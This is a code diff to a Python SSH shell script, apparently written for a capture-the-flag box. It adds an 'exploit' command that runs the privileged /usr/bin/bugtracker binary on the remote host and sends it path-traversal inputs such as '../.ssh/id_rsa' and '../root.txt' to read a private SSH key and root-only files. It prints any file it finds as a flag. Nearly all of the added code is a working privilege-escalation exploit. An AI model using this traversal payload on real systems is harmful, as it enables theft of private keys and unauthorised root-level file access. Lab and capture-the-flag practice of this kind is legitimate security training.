@@ -19,6 +19,29 @@ def ssh_interactive_shell(hostname, username, password):
         while True:
             # Display the shell prompt
             command = input("ssh> ")
+        
+            if command == "exploit":
+                vuln_bin = "/usr/bin/bugtracker"
+                payloads = [".ssh/id_rsa", "flag.txt", "root.txt"]
+                root_prefix = "../"
+                for file_path in payloads:
+                    
+                    print(f"executing {vuln_bin} ")
+                    channel.send(vuln_bin + "\n")
+                    first_output = channel.recv(2048).decode()
+                    print(first_output)
+                    
+                    payload = root_prefix + file_path + "\n"
+                    
+                    channel.send(payload)
+                    
+                    result: str = channel.recv(4096).decode()
+                    
+                    if(not result.__contains__("No such file or directory")):
+                        print("Found flag:\n" + result)
+                        break 
+                    
+                
             if command.lower() in ['exit', 'quit']:
                 break
             
